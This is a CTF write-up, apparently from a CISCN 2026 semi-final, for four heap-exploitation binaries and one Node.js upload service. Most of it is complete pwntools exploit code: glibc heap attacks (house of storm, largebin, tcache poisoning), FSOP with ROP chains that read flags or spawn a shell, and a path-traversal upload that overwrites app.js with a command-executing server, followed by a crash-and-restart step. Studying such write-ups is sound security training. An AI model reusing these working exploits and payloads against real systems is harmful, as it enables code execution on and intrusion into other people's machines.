# CISCN2026 semi-final

## catchme

2.27的libc， 打house of storm

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*
import re
import os
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']
local = 1
ip = "47.93.103.116"
port = 26640
ELF_PATH="./catchme"
if local:
    p = process(ELF_PATH)
else:
    p = remote(ip,port)

elf = ELF(ELF_PATH)
# libc = ELF("./libc.so.6")

sla = lambda x,s : p.sendlineafter(x,s)
sl = lambda s : p.sendline(s)
sa = lambda x,s : p.sendafter(x,s)
s = lambda s : p.send(s)
r = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x, drop=True)

libc = ELF("./libc-2.27.so")

def dbg():
    script = '''
# tel *$rebase(0x202060)
    '''
    if local:
        gdb.attach(p,script)
    pause()

def lg(buf):
    log.success(f'\033[33m{buf}:{eval(buf):#x}\033[0m')


def add(t):
    sla(b'>>\n', b'1')
    sla(b'(3)otter\n', str(t).encode())

def delete(idx):
    sla(b'>>\n', b'2')
    sla(b'index:\n', str(idx).encode())

def show(idx):
    sla(b'>>\n', b'3')
    sla(b'index:\n', str(idx).encode())

def edit(idx, content):
    sla(b'>>\n', b'4')
    sla(b'index:\n', str(idx).encode())
    sa(b'set tag:', content)

def clear(idx):
    sla(b'>>\n', b'6')
    sla(b'index:\n', str(idx).encode())

for i in range(7):
    add(3)
    delete(0)
    clear(0)

add(1) #0
add(1) #1
delete(0)
show(0)

p.recvuntil(b'tag:')
libc_base = u64(p.recv(6).ljust(8, b'\x00')) - libc.sym['__malloc_hook'] - 0x70
lg('libc_base')


add(2) #2
add(2) #3
delete(2)

__free_hook = libc_base + libc.sym['__free_hook']

edit(2, p64(__free_hook - 0x18))
edit(0, p64(__free_hook - 0x10) + p64(0) + p64(__free_hook - 0x35))

ogg = libc_base + 0x4F302


add(3)
edit(4, p64(ogg))

# dbg()
delete(0)




p.interactive()


```

## easy_rw_revenge

proxy里用srand(time(0))生成随机数作为RC4密钥可以被还原。

进入pwn以后有两个洞。一个是用strcmp验证的username有\x00截断， 只需要爆破3位就能获取有效用户名。另一个是程序虽然在Delete里清空指针了， 但是在Add功能开头有一个UAF， 打largebin attack。在Delete里输入不合法index可以退出触发FSOP。

{% raw %}
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*
import re
import os
from pwn import *
from ctypes import *
context(arch='amd64', os='linux', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']

ip = "127.0.0.1"
port = 9999

def lg(buf):
    log.success(f'\033[33m{buf}:{eval(buf):#x}\033[0m')

# target = process('./pwn')

def dbg():
    script = '''
    b _IO_flush_all_lockp
    b _IO_wfile_seekoff
    b _IO_wfile_overflow
    b _IO_wdoallocbuf
    b _IO_switch_to_wget_mode
    '''
    gdb.attach(target, script)
    pause()




def send_packet(p, magic, size, content):
    packet = b''
    packet += p32(magic)
    packet += b'\x00'*8
    packet += p32(size)
    packet += content
    p.send(packet)

libc1 = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")


def get_RC4Key():
    RC4Key = b''
    seed = libc1.time(0)
    libc1.srand(seed)
    # lg('seed')
    for i in range(32):
        byte = libc1.rand() & 0xFF
        RC4Key += p8(byte)
        print('{:x}'.format(byte), end=' ')
    print()
    return RC4Key


def rc4_ksa(key):
    SBOX = list(range(256))
    j = 0
    for i in range(256):
        j = (j + SBOX[i] + key[i % len(key)]) % 256
        SBOX[i], SBOX[j] = SBOX[j], SBOX[i]
    return SBOX

def rc4_crypt(key, data):
    SBOX = rc4_ksa(key)
    i = 0
    j = 0
    result = bytearray()
    for byte in data:
        i = (i + 1) % 256
        j = (j + SBOX[i]) % 256
        SBOX[i], SBOX[j] = SBOX[j], SBOX[i]
        K = SBOX[(SBOX[i] + SBOX[j]) % 256]
        result.append(byte ^ K)
    return bytes(result)

def get_cookie(p):
    passwd = b"#welcome!_c1sCn_2026"
    passwd = rc4_crypt(get_RC4Key(), passwd)
    send_packet(p, 0xFFFF2525, len(passwd), passwd)
    return p.recv(0x20)

p = remote(ip, port)
cookie = get_cookie(p)
print("cookie:", cookie.hex())
p.close()

def send_data(data):
    p = remote(ip, port)
    data = cookie + data
    send_packet(p, 0x7F687985, len(data), data)
    resp = p.recvall()
    # log.success(f"Response: {resp}")
    p.close()
    return resp

def add(idx, size, content=b'a'*0x10):
    payload = f'rtsp://Di2emlXE/{{add:{size}:{idx}:{content}}}'.encode()
    send_data(payload)

def delete(idx):
    payload = f'rtsp://Di2emlXE/{{delete:{idx}:0:}}'.encode()
    send_data(payload)

def edit(idx, content):
    payload = f'rtsp://Di2emlXE/{{edit:{idx}:0:'.encode()
    payload += content
    payload += b'}'

    send_data(payload)

def show(idx):
    payload = f'rtsp://Di2emlXE/{{show:{idx}:0:}}'.encode()
    return send_data(payload)


add(0, 0x520)
add(1, 0x500)
add(2, 0x510)

add(0, -1) # free(0)

add(3, 0x560)
leak_data = show(0)
libc_base = u64(leak_data[0:6].ljust(8, b'\x00')) - 0x203f50

heap_base = u64(leak_data[0x10:0x16].ljust(8, b'\x00')) - 0x13b0 



add(2, -1) # free(2)

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

_IO_list_all = libc_base + libc.sym['_IO_list_all']
lg('_IO_list_all')
lg('libc_base')
lg('heap_base')


pop_rdi = libc_base + 0x000000000010f78b
pop_rsi = libc_base + 0x0000000000110a7d
pop_rbx = libc_base + 0x00000000000586e4
ret = pop_rdi + 1
# 0x00000000000b0168 : mov rdx, rbx ; pop rbx ; pop r12 ; pop rbp ; ret
mov_rdx_rbx = libc_base + 0x00000000000b0168

open_addr = libc_base + libc.symbols['open']
read_addr = libc_base + libc.symbols['read']
write_addr = libc_base + libc.symbols['write']
sendfile = libc_base + libc.symbols['sendfile']


setcontext = libc_base + libc.sym['setcontext'] + 61
# ROPchain_addr = heap_base + 0x18f0
system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b'/bin/sh\x00'))
fake_io_addr = heap_base + 0x13b0
fake_context_addr = heap_base + 0x2320
IO_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']
call_addr = libc_base + libc.symbols["setcontext"] + 61

flag_str = heap_base + 0x14c8

ROPchain = b''
ROPchain += p64(pop_rdi) + p64(flag_str)
ROPchain += p64(pop_rsi) + p64(0)
ROPchain += p64(open_addr)
ROPchain += p64(pop_rdi) + p64(4) # socket
ROPchain += p64(pop_rsi) + p64(5) # flag_fd
ROPchain += p64(pop_rbx) + p64(0) + p64(mov_rdx_rbx) + p64(0)*3
ROPchain += p64(sendfile)




fake_IO_FILE = p64(0)*6
fake_IO_FILE +=p64(1)+p64(2) # rcx!=0(FSOP)
fake_IO_FILE +=p64(fake_io_addr+0xb0)#_IO_backup_base=rdx setcontext rdi
fake_IO_FILE +=p64(call_addr) #_IO_save_end=call addr(call setcontext/system)
fake_IO_FILE = fake_IO_FILE.ljust(0x58, b'\x00')
fake_IO_FILE += p64(0)  # _chain
fake_IO_FILE = fake_IO_FILE.ljust(0x78, b'\x00')
fake_IO_FILE += p64(libc_base + 0x205700)  # _lock = a writable address
fake_IO_FILE = fake_IO_FILE.ljust(0x90, b'\x00')
fake_IO_FILE +=p64(fake_io_addr+0x30)#_wide_data,rax1_addr
fake_IO_FILE = fake_IO_FILE.ljust(0xb0, b'\x00')
fake_IO_FILE += p64(1) #mode=1
fake_IO_FILE = fake_IO_FILE.ljust(0xc8, b'\x00')
fake_IO_FILE += p64(libc_base+0x202258)# _IO_wfile_jumps+48
fake_IO_FILE +=p64(0)*6
fake_IO_FILE += p64(fake_io_addr+0x40) + b"/flag\x00" # rax2_addr
fake_IO_FILE = fake_IO_FILE.ljust(0xa0 + 0x88, b'\x00') + p64(0x40)

fake_IO_FILE = fake_IO_FILE.ljust(0xa0 + 0xa0, b"\x00") + p64(fake_io_addr + 0xa0 + 0xb8) + p64(ret)

fake_IO_FILE += ROPchain

edit(0, p64(0)*3 + p64(_IO_list_all - 0x20))



# edit(1, ROPchain)

fake_context = p64(0) + p64(0xdeadbeef)*0x10
edit(3, fake_context)

add(4, 0x500)
edit(0, fake_IO_FILE)

# dbg()
delete(114514)

# target.close()

```
{% endraw %}
## minidb

主要漏洞点在SET功能里有一条路径可以触发UAF。

```python
      if ( g_database->tx->active == 1 && !strcmp(g_database->tx->target_key, key) )
      {
        free(value);
      }
```

还有在MULTI功能里malloc tx结构体时没有初始化

```
void __fastcall MULTI()
{
  db_t *g_database; // rbx

  if ( ::g_database->in_tx )
  {
    puts("ERR");
  }
  else
  {
    ::g_database->in_tx = 1;
    g_database = ::g_database;
    g_database->tx = (tx_t *)malloc(0x38u);
    puts("TX START");
  }
}
```

我们可以利用SET的UAF释放伪造tx结构体， 用MULTI功能拿回来。

在EXEC功能里free了tx->old_value;至此可以拿到任意地址free的原语。

```c
void __fastcall EXEC()
{
  value_t *ptr; // [rsp+8h] [rbp-8h]

  if ( g_database->in_tx == 1 )
  {
    if ( g_database->tx->active == 1 )
    {
      if ( g_database->tx->old_value )
      {
        ptr = g_database->tx->old_value;
        if ( ptr )
        {
          if ( (__int64)--ptr->ref_cnt <= 0 )
            free(ptr);
        }
      }
    }
    free(g_database->tx);
    g_database->in_tx = 0;
    puts("TX EXEC");
  }
  else
  {
    puts("ERR");
  }
}
```

有了任意地址free， 构造fake chunk， 利用ptmalloc的consolidate机制构造堆块重叠， 在重叠的堆块里提前布置在tcache里的chunk就可以打tcache poison了。

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*
import re
import os
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']
local = 1
ip = "47.93.103.116"
port = 26640
ELF_PATH="./pwn"
if local:
    p = process(ELF_PATH)
else:
    p = remote(ip,port)
elf = ELF(ELF_PATH)
libc = ELF("./libc.so.6")

sla = lambda x,s : p.sendlineafter(x,s)
sl = lambda s : p.sendline(s)
sa = lambda x,s : p.sendafter(x,s)
s = lambda s : p.send(s)
r = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x, drop=True)

def dbg():
    script = '''
    b _IO_flush_all_lockp
    b _IO_wfile_seekoff
    b _IO_wfile_overflow
    b _IO_wdoallocbuf
    b _IO_switch_to_wget_mode

    # tel $rebase(0x4050)
# b GET
# brva 0x1948

# b EXEC
brva 0x1A70

# b SET
# brva 0x1468
    '''
    if local:
        gdb.attach(p,script)
    pause()

def lg(buf):
    log.success(f'\033[33m{buf}:{eval(buf):#x}\033[0m')


def SET(key, value):
    sla(b'> ', b'SET ' + key)
    sa(b'Value> ', value)

def CLONE(src, dst):
    sla(b'> ', b'CLONE ' + src + b' ' + dst)

def GET(key):
    sla(b'> ', b'GET ' + key)

def MULTI():
    sla(b'> ', b'MULTI')

def EXEC():
    sla(b'> ', b'EXEC')

def ABORT():
    sla(b'> ', b'ABORT')



MULTI()
SET(b'0', b'a'*0x450)
CLONE(b'0', b'10')
SET(b'0', b'b'*0x450)
SET(b'0', b'c'*0x460)
GET(b'10')
p.recvuntil(b'VAL: ')
heap_base = u64(p.recv(6).ljust(8, b'\x00')) - 0x530
lg('heap_base')

fake_chunk0_addr = heap_base + 0x550
fake_chunk0 = b''
fake_chunk0 += p64(0) # prev_size
fake_chunk0 += p64(0x530) # size
fake_chunk0 += p64(fake_chunk0_addr) # fd
fake_chunk0 += p64(fake_chunk0_addr) # bk

fake_chunk0 = fake_chunk0.ljust(0x450, b'\x00')


SET(b'1', fake_chunk0)

fake_value = b''
fake_value += p64(0) # ref_count
fake_value += p64(0x10) # size
fake_value += b'z'*0x10 # data

fake_chunk = b''
fake_chunk += p64(0x530) # prev_size
fake_chunk += p64(0x850 + 0x1a0) # size
fake_chunk += fake_value # value
fake_chunk = fake_chunk.ljust(0x3d0, b'\x00')

SET(b'2', fake_chunk)

EXEC()

old_value_addr = heap_base + 0xa80 + 0x10
new_value_addr = 0xdeadbeef

fake_tx = b''
fake_tx += b'A'*0x10
fake_tx += p64(old_value_addr) # old_value
fake_tx += p64(new_value_addr) # new_value
fake_tx += p64(1) # active

SET(b'3', fake_tx)
SET(b'4', b'C'*0x70)

SET(b'4', b'C'*0x70)
SET(b'3', b'B'*0x20)




MULTI()


EXEC()
SET(b'4', b'a'*0x8f0)
GET(b'0')
p.recvuntil(b'VAL: ')
libc_base = u64(p.recv(6).ljust(8, b'\x00')) - 0x21ace0
lg('libc_base')

stdout_addr = libc_base + libc.sym["_IO_2_1_stdout_"]
pop_rbp = libc_base+ 0x000000000002a2e0
leave_ret = libc_base+ 0x000000000004da83
ret = pop_rbp + 1

target = libc_base + libc.sym['_IO_list_all'] - 0x10

SET(b'5', b'a'*0x500)
payload = b''
payload += p64(0) # prev_size
payload += p64(0x91) # size
payload += p64(((heap_base+0x13f0)>>12)^target) # fd
payload += p64(0xdeadbeef) # bk


SET(b'6', payload)

fake_unsorted = b''
fake_unsorted += p64(0) # prev_size
fake_unsorted += p64(0x21) # size
fake_unsorted += p64(libc_base + 0x21ace0) # fd
fake_unsorted += p64(libc_base + 0x21ace0) # bk

fake_io_file_addr = heap_base + 0x1548 + 0x8

_IO_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']
lg('_IO_wfile_jumps')
call_addr = libc_base + libc.sym['system']

fake_IO_FILE=flat(
{
    0x0:[b'     sh;'],     # rdi = binsh
    0x20:[p64(0)],            # write_base
    0x28:[p64(1)],            # write_ptr --> ptr > base
    0x48:[p64(call_addr)],

    0xc0:[p64(0)],            # _mode <= 0
    0xd8:[p64(_IO_wfile_jumps)],

    0x88:[p64(fake_io_file_addr+0x90),p64(0),p64(call_addr)],   # bypass lock

    0xA0:[p64(fake_io_file_addr-0x10)],         # bypass check in wfile_seekoff
    0x10:[p64(1)],
    0x18:[p64(0)],
    # (0xB0+0xd8):[p64(fake_io_file_addr+0xB0+0xd8)], # fake wfile vtable
    (0xc8):[p64(fake_io_file_addr+0xd0-0x18)],   
    (0xd0):[p64(fake_io_file_addr+0x30)],   # call entry
    }, filler=b'\x00'
)

SET(b'7', b'z'*0x40 + fake_unsorted + p64(0x20)+p64(0x20))
SET(b'7', p64(fake_io_file_addr) + b'E'*0x68)

SET(b'8', fake_IO_FILE)

# libc_base + 0x8ec9f
# dbg()
p.sendline(b'EXIT')
p.interactive()
```

## broken_manager

程序自己实现了一个简单的malloc和free, malloc里主要模仿了tcache的机制， 用key加密next指针。

漏洞点一个是delete功能的经典UAF， 还有一个比较独特的是程序设置了一个sigaltstack， 只要程序崩溃就会进入handler获得leak

```c
__int64 __fastcall sigsegv_handler(__int64 signum, siginfo_t *info)
{
  ucontext *ucontext; // rdx
  unsigned int si_errno; // [rsp+24h] [rbp-Ch]
  void *si_addr; // [rsp+28h] [rbp-8h]

  puts("Unfortunaly, a serious problem crash the system");
  puts("There are some information about the bug, please copy them and send to xxx@yyy.zzz");
  puts("Then, I will try my best to recover the program, but it still suggest to restart it.");
  si_errno = info->si_errno;
  si_addr = info->_sifields._sigfault.si_addr;
  memset(&main_arena, 0, sizeof(main_arena));
  memset(content_array, 0, sizeof(content_array));
  memset(size_array, 0, sizeof(size_array));
  printf("Invalid ptr access: %p\n", si_addr);
  printf("Errno: %d\n", si_errno);
  return main((int)"Errno: %d\n", (char **)si_errno, ucontext);
}
```

其实就是打tcache poison， 只不过要根据leak算一下key和mmap_base

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*
import re
import os
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']
local = 1
ip = "47.93.103.116"
port = 26640
ELF_PATH="./pwn"
if local:
    p = process(ELF_PATH)
else:
    p = remote(ip,port)
elf = ELF(ELF_PATH)
libc = ELF("./libc.so.6")

sla = lambda x,s : p.sendlineafter(x,s)
sl = lambda s : p.sendline(s)
sa = lambda x,s : p.sendafter(x,s)
s = lambda s : p.send(s)
r = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x, drop=True)

def dbg():
    script = '''
    #Malloc
# brva 0x14F0
# content_array
disp/x $rebase(0x50c0)
# main_arena
disp/x $rebase(0x5060)
# main ret
brva 0x1F75

    '''
    if local:
        gdb.attach(p,script)
    pause()

def lg(buf):
    log.success(f'\033[33m{buf}:{eval(buf):#x}\033[0m')

def add(idx, size, content=b"A\n"):
    p.sendlineafter(b">> ", b"1")
    p.sendlineafter(b"Index: ", str(idx).encode())
    p.sendlineafter(b"Size: ", str(size).encode())
    p.sendafter(b"Content: ", content)

def delete(idx):
    p.sendlineafter(b">> ", b"2")
    p.sendlineafter(b"Index: ", str(idx).encode())

def edit(idx, content):
    p.sendlineafter(b">> ", b"4")
    p.sendlineafter(b"Index: ", str(idx).encode())
    p.sendafter(b"Content: ", content)

# 安全规避 PTY 脏字符回显读取
def show(idx):
    p.sendlineafter(b">> ", b"3")
    p.sendlineafter(b"Index: ", str(idx).encode())


add(0, 0x20, b'a'*0x20)
add(1, 0x20, b'a'*0x20)
add(2, 0x20, b'a'*0x20)

delete(0)
delete(0)
show(0)

leak1 = u32(p.recv(4))
lg('leak1')


add(3, 0x20, p32(0xdeadbeef))
add(4, 0x20, b'a'*0x20)
p.sendlineafter(b">> ", b"1")
p.sendlineafter(b"Index: ", b'5')



p.sendlineafter(b"Size: ", b'32')

p.recvuntil(b'Invalid ptr access: 0x')
fault_addr = int(p.recv(12), 16)
lg('fault_addr')

wilderness = fault_addr & 0xFFFFFFFF00000000
key1 = (fault_addr & 0xFFFFFFFF) ^ 0xdeadbeef
lg('key1')
area_low = ((leak1 ^ key1) - 0xA4) & 0xFFFFFFFF

mmap_base = (wilderness | area_low) - 0x4000
lg('mmap_base')

add(0, 0x50, b'a'*0x50)
add(1, 0x50, b'a'*0x50)
add(2, 0x50, b'a'*0x50)
delete(0)
delete(0)
show(0)

leak2 = u32(p.recv(4))
lg('leak2')

a = ((mmap_base + 0x8000 + 0xA4) & 0xFFFFFFFF)
lg('a')

key2 = leak2 ^ a
lg('key2')

target = mmap_base + 0x3ab8
lg('target')

# add(2, 0x50, p32(target&0xFFFFFFFF ^ key2))

add(3, 0x50, p32((target&0xFFFFFFFF) ^ key2))
add(4, 0x50, p32(0xdeadbeef))
add(5, 0x50, b'a'*1)

show(5)
libc_base = u64(p.recv(6).ljust(8, b'\x00')) - 0x45361
lg('libc_base')

libc.address = libc_base
rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
lg('pop_rdi')
ret = pop_rdi + 1
binsh = next(libc.search(b'/bin/sh\x00'))
system = libc.sym['system']

rop_chain = p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)

edit(5, rop_chain)

p.sendlineafter(b">> ", b"5")
p.sendline(b'cat flag')

# dbg()

p.interactive()
```

## UpNodeTrap

```js
if (req.method === 'POST' && req.url === '/upload') {
    let body = '';
    req.on('data', chunk => {
      body += chunk.toString();
    });
    req.on('end', () => {
      let data;
      try {
        data = JSON.parse(body);
      } catch {
        return sendJSON(res, 400, { error: 'Request payload is not valid JSON.' });
      }
      const { filename, content } = data;
      if (!filename || !content) {
        return sendJSON(res, 400, { error: 'Missing required fields: filename or content.' });
      }
      const filePath = path.join(uploadsDir, filename);
      fs.writeFile(filePath, content, err => {
        if (err) {
          return sendJSON(res, 500, { error: 'Unable to persist file to storage.' });
        }
        sendJSON(res, 200, {
          status: 'Upload completed.',
          location: filePath
        });
      });
    });
    return;
  }
```

漏洞集中在upload功能里， 一个是路径穿越漏洞可以用恶意的app.js覆盖原来的app.js， 然后就是对filename和content的检查不严格，而且没有异常处理。 可以传入异常数据类型导致程序崩溃， 重启以后执行恶意的app.js读取flag。

```python
import requests
import time
import json

# 替换为 CTF 靶机的实际地址
url = "http://127.0.0.1:9999"

# 恶意 app.js Payload:
# 这个脚本将会在服务重启时接管 9999 端口，直接通过 child_process 执行系统命令读取 flag
malicious_app_js = """
const http = require('http');
const { execSync } = require('child_process');

const server = http.createServer((req, res) => {
    try {
        // 尝试通过 cat 命令读取根目录或当前目录下的 flag 文件
        const flag = execSync('cat /flag* || cat ./flag* || echo "Flag not found"').toString();
        res.writeHead(200, { 'Content-Type': 'text/plain' });
        res.end("Pwned by you!\\n\\n" + flag);
    } catch (e) {
        res.writeHead(500);
        res.end("Error executing command: " + e.message);
    }
});

const PORT = 9999;
server.listen(PORT, () => {
    console.log(`Malicious server running on port ${PORT}`);
});
"""

def exploit():
    print("[*] 阶段 1: 正在利用目录穿越覆盖服务端的 app.js...")
    try:
        res_upload = requests.post(f"{url}/upload", json={
            "filename": "../app.js",
            "content": malicious_app_js
        })
        print(f"[+] 覆盖结果: HTTP {res_upload.status_code}")
    except Exception as e:
        print(f"[-] 覆盖请求异常: {e}")

    print("\n[*] 阶段 2: 正在发送异常数据类型(数组)引发 Node.js 进程崩溃重启...")
    try:
        # 使用 filename: [] 会绕过非空检查，但在 path.join 时触发 TypeError 使进程崩溃
        requests.post(f"{url}/upload", json={
            "filename": [],
            "content": "crash_the_server"
        }, timeout=2)
    except requests.exceptions.ReadTimeout:
        print("[+] 服务器无响应，说明进程已成功崩溃并退出！")
    except Exception as e:
        print(f"[-] 崩溃请求异常: {e}")

    print("\n[*] 阶段 3: 等待靶机环境(如 pm2 / docker)自动重启服务...")
    pause()

    print("\n[*] 阶段 4: 正在从我们的恶意服务读取 Flag...")
    try:
        # 由于 app.js 已被我们替换，此时的服务器应该会直接把命令执行结果返回给我们
        res_flag = requests.get(url)
        print("="*40)
        print(res_flag.text)
        print("="*40)
    except Exception as e:
        print(f"[-] 获取 Flag 失败: {e} (可能是环境没有配置自动重启)")

if __name__ == "__main__":
    exploit()
```

